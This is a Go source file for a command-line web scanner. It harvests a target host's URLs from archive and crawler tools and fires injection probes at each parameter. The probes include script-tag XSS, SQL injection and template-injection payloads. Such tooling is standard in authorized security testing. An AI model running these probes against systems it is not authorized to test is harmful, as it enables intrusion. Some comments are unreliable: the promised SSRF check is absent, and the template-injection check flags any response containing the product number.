// reflx — takes a single host, pulls its URLs from wayback/gau/katana/waymore,
// collapses obviously-duplicate URLs down to one representative per endpoint
// shape, builds a per-endpoint parameter wordlist from the live response, and
// fires one combined XSS+SQLi+SSTI(+SSRF) probe per parameter as both GET and
// POST. Intended for use against hosts you're authorized to test.
package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ---------------------------------------------------------------------------
// CLI flags
// ---------------------------------------------------------------------------

var (
	flagTarget    = flag.String("u", "", "target — a bare host (e.g. example.com) for host mode, or a full URL with a query string (e.g. https://example.com/search?q=x) for single-URL mode (required)")
	flagMode      = flag.String("mode", "auto", "auto | host | url — auto detects host vs single-URL based on -u (default auto)")
	flagOut       = flag.String("o", "findings.txt", "output file for findings")
	flagThreads   = flag.Int("t", 20, "concurrent workers for testing phase")
	flagTimeout   = flag.Duration("timeout", 10*time.Second, "per-request timeout")
	flagRate      = flag.Duration("delay", 50*time.Millisecond, "delay between requests per worker (politeness)")
	flagMaxURLs   = flag.Int("max-urls", 500, "cap on number of deduped URLs actually tested in host mode (0 = no cap)")
	flagVerbose   = flag.Bool("v", false, "verbose logging")
	flagInsecure  = flag.Bool("k", true, "skip TLS verification (targets often have self-signed/staging certs)")
	flagNoUI      = flag.Bool("no-ui", false, "disable the live dashboard and just print plain scrolling log lines (use this when piping to a file)")
	flagCookie    = flag.String("c", "", `optional cookie header to send with every request, e.g. -c "session=abc123; role=admin"`)
	flagMaxParams = flag.Int("max-params", 40, "cap on how many parameters get tested per endpoint (0 = no cap). Prevents pages with large embedded JSON from ballooning into hundreds of requests per endpoint.")
)

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

func main() {
	flag.Parse()
	if *flagTarget == "" {
		fmt.Println("usage:")
		fmt.Println("  host mode:       reflx -u example.com [-o findings.txt]")
		fmt.Println("  single-URL mode: reflx -u 'https://example.com/search?q=x' [-o findings.txt]")
		os.Exit(1)
	}

	mode := resolveMode(*flagTarget, *flagMode)

	var deduped []string
	switch mode {
	case "host":
		host := normalizeHost(*flagTarget)
		log.Printf("[*] host mode: collecting URLs for %s from wayback / gau / katana / waymore", host)
		raw := collectURLs(host)
		log.Printf("[*] collected %d raw URLs", len(raw))

		deduped = dedupeURLs(raw)
		log.Printf("[*] %d unique endpoint shapes after dedup", len(deduped))

		if *flagMaxURLs > 0 && len(deduped) > *flagMaxURLs {
			log.Printf("[*] capping to first %d URLs (use -max-urls 0 to disable)", *flagMaxURLs)
			deduped = deduped[:*flagMaxURLs]
		}

	case "url":
		log.Printf("[*] single-URL mode: testing only %s", *flagTarget)
		deduped = []string{*flagTarget}

	default:
		log.Fatalf("could not determine mode for %q — pass -mode host or -mode url explicitly", *flagTarget)
	}

	if len(deduped) == 0 {
		log.Println("[*] nothing to test — exiting")
		return
	}

	out, err := os.Create(*flagOut)
	if err != nil {
		log.Fatalf("cannot open output file: %v", err)
	}
	defer out.Close()
	var outMu sync.Mutex

	client := newHTTPClient()

	jobs := make(chan string, len(deduped))
	for _, u := range deduped {
		jobs <- u
	}
	close(jobs)

	var wg sync.WaitGroup
	var found int64
	var foundMu sync.Mutex

	workers := *flagThreads
	if mode == "url" && workers > 1 {
		workers = 1 // no point parallelizing a single target
	}

	if !*flagNoUI {
		dashStart(*flagTarget, mode, len(deduped))
		defer dashStop()
	}

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for target := range jobs {
				time.Sleep(*flagRate)
				results := testEndpoint(client, target)
				if len(results) == 0 {
					continue
				}
				outMu.Lock()
				for _, r := range results {
					line := r.String()
					fmt.Fprintln(out, line)
					dashFinding(r.Kind, line)
				}
				outMu.Unlock()
				foundMu.Lock()
				found += int64(len(results))
				foundMu.Unlock()
			}
		}()
	}
	wg.Wait()

	if !*flagNoUI {
		dashStop()
	}
	log.Printf("[*] done — %d candidate findings written to %s", found, *flagOut)
}

// resolveMode decides host vs url mode. Explicit -mode wins; "auto" infers
// from the target string: anything with "://" and a "?" is treated as a
// single URL, everything else as a bare host.
func resolveMode(target, modeFlag string) string {
	if modeFlag == "host" || modeFlag == "url" {
		return modeFlag
	}
	if strings.Contains(target, "://") && strings.Contains(target, "?") {
		return "url"
	}
	if strings.Contains(target, "://") {
		// a full URL with no query string — nothing to fuzz as-is, but it's
		// still clearly a single URL, not a bare host to crawl.
		return "url"
	}
	return "host"
}

// ---------------------------------------------------------------------------
// Step 1: URL collection from external sources
// ---------------------------------------------------------------------------

func normalizeHost(h string) string {
	h = strings.TrimPrefix(h, "https://")
	h = strings.TrimPrefix(h, "http://")
	h = strings.TrimSuffix(h, "/")
	return h
}

// collectURLs shells out to gau/katana/waymore if present, and always hits the
// Wayback CDX API directly (no external dependency needed for that one).
func collectURLs(host string) []string {
	var all []string
	var mu sync.Mutex
	var wg sync.WaitGroup

	add := func(urls []string) {
		mu.Lock()
		all = append(all, urls...)
		mu.Unlock()
	}

	wg.Add(1)
	go func() {
		defer wg.Done()
		urls, err := fetchWaybackCDX(host)
		if err != nil {
			logv("wayback CDX error: %v", err)
			return
		}
		logv("wayback CDX: %d urls", len(urls))
		add(urls)
	}()

	if binExists("gau") {
		wg.Add(1)
		go func() {
			defer wg.Done()
			urls := runCommandLines("gau", host)
			logv("gau: %d urls", len(urls))
			add(urls)
		}()
	}

	if binExists("katana") {
		wg.Add(1)
		go func() {
			defer wg.Done()
			urls := runCommandLines("katana", "-u", host, "-d", "5", "-silent")
			logv("katana: %d urls", len(urls))
			add(urls)
		}()
	}

	if binExists("waymore") {
		wg.Add(1)
		go func() {
			defer wg.Done()
			tmp, err := os.CreateTemp("", "waymore-*.txt")
			if err != nil {
				return
			}
			tmp.Close()
			defer os.Remove(tmp.Name())
			// --providers explicitly whitelists which sources waymore queries.
			// VirusTotal is intentionally left out: it requires its own API
			// key to be useful, silently contributes nothing without one, and
			// some users would rather not have their target domain sent to a
			// third-party VT lookup as a side effect of running this tool.
			cmd := exec.Command("waymore", "-mode", "U", "--providers", "wayback,commoncrawl,otx,urlscan", "-i", host, "-oU", tmp.Name())
			_ = cmd.Run()
			data, err := os.ReadFile(tmp.Name())
			if err != nil {
				return
			}
			urls := strings.Split(strings.TrimSpace(string(data)), "\n")
			logv("waymore: %d urls", len(urls))
			add(urls)
		}()
	}

	wg.Wait()

	// only keep URLs that have query parameters — this tool tests params.
	var withParams []string
	for _, u := range all {
		if strings.Contains(u, "?") && strings.Contains(u, "=") {
			withParams = append(withParams, strings.TrimSpace(u))
		}
	}
	return withParams
}

func fetchWaybackCDX(host string) ([]string, error) {
	api := fmt.Sprintf("https://web.archive.org/cdx/search/cdx?url=%s/*&output=text&fl=original&collapse=urlkey&limit=100000",
		url.QueryEscape(host))
	req, err := http.NewRequest("GET", api, nil)
	if err != nil {
		return nil, err
	}
	client := &http.Client{Timeout: 60 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	lines := strings.Split(strings.TrimSpace(string(body)), "\n")
	var out []string
	for _, l := range lines {
		if l != "" {
			out = append(out, l)
		}
	}
	return out, nil
}

func binExists(name string) bool {
	_, err := exec.LookPath(name)
	return err == nil
}

func runCommandLines(name string, args ...string) []string {
	cmd := exec.Command(name, args...)
	var buf bytes.Buffer
	cmd.Stdout = &buf
	_ = cmd.Run()
	var out []string
	scanner := bufio.NewScanner(&buf)
	scanner.Buffer(make([]byte, 1024*1024), 1024*1024)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			out = append(out, line)
		}
	}
	return out
}

// ---------------------------------------------------------------------------
// Step 2: smart dedup
//
// Two URLs are considered "the same endpoint" if, after normalization, they
// share the same path shape and the same set of query PARAMETER NAMES (values
// ignored). Purely numeric / UUID / hex path segments are collapsed to a
// placeholder so /profile/123 and /profile/321 count as one. Known
// tracking/analytics query params (utm_*, fbclid, gclid, etc.) are stripped
// before comparison so they never create a false "new" endpoint.
// ---------------------------------------------------------------------------

var trackingParams = map[string]bool{
	"utm_source": true, "utm_medium": true, "utm_campaign": true, "utm_term": true,
	"utm_content": true, "fbclid": true, "gclid": true, "msclkid": true, "mc_cid": true,
	"mc_eid": true, "igshid": true, "ref": true, "ref_src": true, "spm": true,
	"_ga": true, "_gl": true, "yclid": true, "dclid": true,
}

var (
	numericSeg = regexp.MustCompile(`^\d+$`)
	uuidSeg    = regexp.MustCompile(`(?i)^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`)
	hexSeg     = regexp.MustCompile(`(?i)^[0-9a-f]{16,}$`)
)

func normalizePath(path string) string {
	segs := strings.Split(path, "/")
	for i, s := range segs {
		if s == "" {
			continue
		}
		switch {
		case numericSeg.MatchString(s):
			segs[i] = "{N}"
		case uuidSeg.MatchString(s):
			segs[i] = "{UUID}"
		case hexSeg.MatchString(s):
			segs[i] = "{HEX}"
		}
	}
	return strings.Join(segs, "/")
}

// dedupeURLs returns one representative URL per unique (host, normalized
// path, sorted non-tracking param names) key. First-seen URL wins, since it's
// as good a concrete example as any.
func dedupeURLs(urls []string) []string {
	seen := make(map[string]bool)
	var result []string

	for _, raw := range urls {
		u, err := url.Parse(raw)
		if err != nil || u.Host == "" {
			continue
		}
		q := u.Query()
		var keptNames []string
		for name := range q {
			if trackingParams[strings.ToLower(name)] {
				continue
			}
			keptNames = append(keptNames, strings.ToLower(name))
		}
		sort.Strings(keptNames)

		key := u.Host + "|" + normalizePath(u.Path) + "|" + strings.Join(keptNames, ",")
		if seen[key] {
			continue
		}
		seen[key] = true
		result = append(result, raw)
	}
	return result
}

// ---------------------------------------------------------------------------
// Step 3: per-endpoint parameter wordlist
//
// Combines: params already present in the URL, form field names/ids scraped
// from the live HTML response, JSON keys found in the response body, and a
// built-in high-value default list.
// ---------------------------------------------------------------------------

var defaultParams = []string{
	"id", "page", "search", "q", "query", "keyword", "redirect", "redirect_uri", "return",
	"return_url", "returnUrl", "next", "url", "u", "dest", "destination", "continue",
	"target", "file", "path", "filename", "filepath", "template", "view", "load",
	"include", "doc", "document", "name", "username", "email", "user", "callback",
	"jsonp", "cb", "token", "auth", "debug", "test", "cmd", "exec", "action", "type",
	"category", "cat", "sort", "order", "lang", "locale", "ref", "source", "src",
	"host", "domain", "site", "endpoint", "api", "data", "content", "message", "msg",
	"comment", "body", "title", "description", "value", "input", "output", "format",
}

var (
	formInputRe = regexp.MustCompile(`(?i)<(?:input|select|textarea)[^>]*\bname=["']([a-zA-Z0-9_\[\]-]+)["']`)
	jsonKeyRe   = regexp.MustCompile(`"([a-zA-Z0-9_-]{2,30})"\s*:`)
)

func setCommonHeaders(req *http.Request) {
	req.Header.Set("User-Agent", "Mozilla/5.0 (reflx)")
	if *flagCookie != "" {
		req.Header.Set("Cookie", *flagCookie)
	}
}

// jsonKeyBlacklist filters out JSON keys that are almost never real input
// parameters and mostly just add noise pulled from response bodies (CSS/JS
// blobs, tracking metadata, framework boilerplate, etc.).
var jsonKeyBlacklist = map[string]bool{
	"class": true, "style": true, "width": true, "height": true, "color": true,
	"rel": true, "type": true, "charset": true, "viewport": true, "http": true,
	"https": true, "www": true, "com": true, "org": true, "png": true, "jpg": true,
	"svg": true, "css": true, "js": true, "html": true, "true": true, "false": true,
	"null": true, "undefined": true, "function": true, "var": true, "const": true,
	"let": true, "this": true, "self": true, "window": true, "document": true,
	"length": true, "index": true, "key": true,
}

func discoverParams(client *http.Client, target string) []string {
	// urlAndFormParams: names that came from the URL itself or from actual
	// <input>/<select>/<textarea> fields — these are real, high-confidence
	// candidates and are always kept in full.
	urlAndFormParams := make(map[string]bool)
	// jsonParams: names scraped from JSON-looking keys in the response body —
	// noisier, filtered against a blacklist, and subject to the -max-params cap.
	jsonParams := make(map[string]bool)

	u, err := url.Parse(target)
	if err == nil {
		for name := range u.Query() {
			urlAndFormParams[strings.ToLower(name)] = true
		}
	}

	req, err := http.NewRequest("GET", target, nil)
	if err == nil {
		setCommonHeaders(req)
		resp, err := client.Do(req)
		if err == nil {
			defer resp.Body.Close()
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
			text := string(body)

			for _, m := range formInputRe.FindAllStringSubmatch(text, -1) {
				urlAndFormParams[strings.ToLower(strings.Trim(m[1], "[]"))] = true
			}
			for _, m := range jsonKeyRe.FindAllStringSubmatch(text, -1) {
				name := strings.ToLower(m[1])
				if jsonKeyBlacklist[name] || len(name) < 2 {
					continue
				}
				jsonParams[name] = true
			}
		}
	}

	// URL/form params always win a slot. Default high-value names come next.
	// JSON-scraped names fill any remaining room up to -max-params, since
	// they're the noisiest source and the main cause of endpoints ballooning
	// to 60-70+ "parameters" (and therefore 240-280+ requests) on pages with
	// large embedded JSON blobs.
	final := make(map[string]bool)
	for p := range urlAndFormParams {
		final[p] = true
	}
	for _, p := range defaultParams {
		if *flagMaxParams > 0 && len(final) >= *flagMaxParams {
			break
		}
		final[p] = true
	}
	for p := range jsonParams {
		if *flagMaxParams > 0 && len(final) >= *flagMaxParams {
			break
		}
		final[p] = true
	}

	var out []string
	for p := range final {
		if p == "" {
			continue
		}
		out = append(out, p)
	}
	sort.Strings(out)
	return out
}

// ---------------------------------------------------------------------------
// Step 4: combined XSS + SQLi + SSTI (+ optional SSRF) probe
// ---------------------------------------------------------------------------

type Finding struct {
	Kind   string // XSS, SQLi, SSTI, SSRF
	Method string // GET, POST
	URL    string
	Param  string
	Detail string
}

func (f Finding) String() string {
	return fmt.Sprintf("[%s][%s] %s  param=%s  %s", f.Kind, f.Method, f.URL, f.Param, f.Detail)
}

var sqlErrorRe = regexp.MustCompile(`(?i)(you have an error in your sql syntax|warning: mysql_|unclosed quotation mark|` +
	`ORA-\d{5}|PostgreSQL.*ERROR|SQLSTATE\[\w+\]|System\.Data\.SqlClient\.SqlException|Npgsql\.PostgresException|` +
	`SQLite3::query|sqlite3\.OperationalError|pg_query\(\)|mysqli_sql_exception)`)

func randMarker(prefix string) string {
	return fmt.Sprintf("%s%d", prefix, rand.Intn(900000)+100000)
}

// buildPayload combines XSS + SQLi + SSTI into one value so a single request
// tests all three classes at once. The SSTI portion is the core "reflected
// math" check: we send {{a*b}} / ${a*b} / <%= a*b %> and later check whether
// the evaluated product (e.g. 49 for 7*7) comes back in the response —
// that's the signal that the input is being evaluated server-side rather
// than just echoed back as text.
func buildPayload(xssMark, sqliMark string, sstiA, sstiB int) string {
	xss := fmt.Sprintf(`"'><script>/*%s*/document.title='%s'</script>`, xssMark, xssMark)
	sqli := fmt.Sprintf(`' OR SLEEP(0)-- %s`, sqliMark) // non-blocking marker variant; error-based probe is separate
	ssti := fmt.Sprintf(`{{%d*%d}}$${%d*%d}<%%= %d*%d %%>`, sstiA, sstiB, sstiA, sstiB, sstiA, sstiB)
	return xss + sqli + ssti
}

// sqlErrorPayload is sent as a *separate* value on the same request round for
// error-based SQLi, since a syntax-breaking quote can sometimes prevent the
// rest of the page (and therefore XSS/SSTI reflection) from rendering.
const sqlErrorPayload = `'"` + "`" + `)`

func testEndpoint(client *http.Client, target string) []Finding {
	var findings []Finding

	u, err := url.Parse(target)
	if err != nil {
		return nil
	}
	// origQuery holds whatever parameters the target URL already came with
	// (e.g. ?id=1). These are treated as required — they ride along on every
	// single test request, GET or POST, so the endpoint keeps working even
	// while we're fuzzing a *different* parameter on it.
	origQuery := u.Query()

	params := discoverParams(client, target)
	if len(params) == 0 {
		return nil
	}

	total := len(params) * 4
	dashBeginURL(target, total)
	defer dashFinishURL()

	// step is local to THIS testEndpoint call — never shared with any other
	// concurrently-running endpoint's goroutine — so the numerator we report
	// to the dashboard always matches the denominator (total) it's being
	// compared against, regardless of how many other endpoints are being
	// tested at the same time.
	var step int64

	a, b := rand.Intn(89)+10, rand.Intn(89)+10 // two 2-digit numbers, e.g. 7*7 style but wider range to avoid coincidental matches
	product := a * b
	xssMark := randMarker("XSSOK")
	sqliMark := randMarker("SQLIOK")
	combined := buildPayload(xssMark, sqliMark, a, b)

	basePath := *u
	basePath.RawQuery = ""

	advance := func() {
		n := atomic.AddInt64(&step, 1)
		dashUpdateCurrent(target, int(n), total)
	}

	for _, p := range params {
		// --- GET: combined payload, original query params kept intact except the one under test ---
		findings = append(findings, probe(client, "GET", basePath.String(), origQuery, p, combined, xssMark, product, sstiMarkers(a, b), advance)...)
		findings = append(findings, probeSQLOnly(client, "GET", basePath.String(), origQuery, p, sqlErrorPayload, advance)...)

		// --- POST: payload goes in the form body under p; original query params
		//     stay attached to the URL itself (minus p, if p happens to be one of
		//     them) so any param the endpoint requires to function is still there,
		//     and p itself gets genuinely tested as a POST field. ---
		findings = append(findings, probe(client, "POST", basePath.String(), origQuery, p, combined, xssMark, product, sstiMarkers(a, b), advance)...)
		findings = append(findings, probeSQLOnly(client, "POST", basePath.String(), origQuery, p, sqlErrorPayload, advance)...)
	}
	return findings
}

func sstiMarkers(a, b int) [3]string {
	// mirrors buildPayload's three template syntaxes so we know what evaluated result to look for
	return [3]string{"jinja/twig", "freemarker/velocity", "erb"}
}

func probe(client *http.Client, method, target string, origQuery url.Values, param, payload, xssMark string, product int, engines [3]string, advance func()) []Finding {
	var findings []Finding
	body, headers, err := sendRequest(client, method, target, origQuery, param, payload)
	advance()
	if err != nil {
		return nil
	}

	// XSS: our marker landed inside a <script> or attribute context unescaped
	if strings.Contains(body, "document.title='"+xssMark+"'") {
		findings = append(findings, Finding{"XSS", method, requestSummary(target, origQuery, param), param, "unescaped script-context reflection of unique marker"})
	}

	// SQLi: error signature present
	if sqlErrorRe.MatchString(body) {
		findings = append(findings, Finding{"SQLi", method, requestSummary(target, origQuery, param), param, "DB error signature triggered by combined payload"})
	}

	// SSTI: evaluated product present with any of the marker syntaxes nearby.
	// This is the core reflected-math test — e.g. we send {{7*7}} and check
	// whether the response contains "49", meaning the server evaluated it.
	productStr := strconv.Itoa(product)
	if strings.Contains(body, productStr) {
		findings = append(findings, Finding{"SSTI", method, requestSummary(target, origQuery, param), param,
			fmt.Sprintf("input evaluated server-side: sent a*b, got %s back in response (candidate — verify engine: %v)", productStr, engines)})
	}

	_ = headers
	return findings
}

func probeSQLOnly(client *http.Client, method, target string, origQuery url.Values, param, payload string, advance func()) []Finding {
	var findings []Finding
	body, _, err := sendRequest(client, method, target, origQuery, param, payload)
	advance()
	if err != nil {
		return nil
	}
	if sqlErrorRe.MatchString(body) {
		findings = append(findings, Finding{"SQLi", method, requestSummary(target, origQuery, param), param, "DB error signature triggered by syntax-breaking payload"})
	}
	return findings
}

// requestSummary rebuilds a human-readable representation of what was
// actually requested (path + the original required params + which one was
// under test), for the findings output.
func requestSummary(target string, origQuery url.Values, testedParam string) string {
	u, err := url.Parse(target)
	if err != nil {
		return target
	}
	q := cloneValues(origQuery)
	q.Set(testedParam, "<payload>")
	u.RawQuery = q.Encode()
	return u.String()
}

func cloneValues(v url.Values) url.Values {
	out := make(url.Values, len(v))
	for k, vals := range v {
		cp := make([]string, len(vals))
		copy(cp, vals)
		out[k] = cp
	}
	return out
}

func sendRequest(client *http.Client, method, target string, origQuery url.Values, param, payload string) (string, http.Header, error) {
	switch method {
	case "GET":
		u, err := url.Parse(target)
		if err != nil {
			return "", nil, err
		}
		// start from the endpoint's original required params, then set/override
		// the one under test — every other original param stays as-is.
		q := cloneValues(origQuery)
		q.Set(param, payload)
		u.RawQuery = q.Encode()

		req, err := http.NewRequest("GET", u.String(), nil)
		if err != nil {
			return "", nil, err
		}
		setCommonHeaders(req)
		dashLogRequest("GET", u.String())
		resp, err := client.Do(req)
		if err != nil {
			return "", nil, err
		}
		defer resp.Body.Close()
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
		return string(b), resp.Header, nil

	case "POST":
		u, err := url.Parse(target)
		if err != nil {
			return "", nil, err
		}
		// keep every original required param attached to the URL itself
		// (minus the one under test, which moves into the POST body so it's
		// genuinely exercised as a POST parameter).
		q := cloneValues(origQuery)
		q.Del(param)
		u.RawQuery = q.Encode()

		form := url.Values{}
		form.Set(param, payload)

		req, err := http.NewRequest("POST", u.String(), strings.NewReader(form.Encode()))
		if err != nil {
			return "", nil, err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		setCommonHeaders(req)
		dashLogRequest("POST", u.String()+"  [body: "+form.Encode()+"]")
		resp, err := client.Do(req)
		if err != nil {
			return "", nil, err
		}
		defer resp.Body.Close()
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
		return string(b), resp.Header, nil
	}
	return "", nil, fmt.Errorf("unknown method %s", method)
}

// ---------------------------------------------------------------------------
// misc
// ---------------------------------------------------------------------------

func newHTTPClient() *http.Client {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: *flagInsecure},
	}
	return &http.Client{
		Timeout:   *flagTimeout,
		Transport: tr,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 5 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}
}

func logv(format string, args ...interface{}) {
	if *flagVerbose {
		log.Printf(format, args...)
	}
}
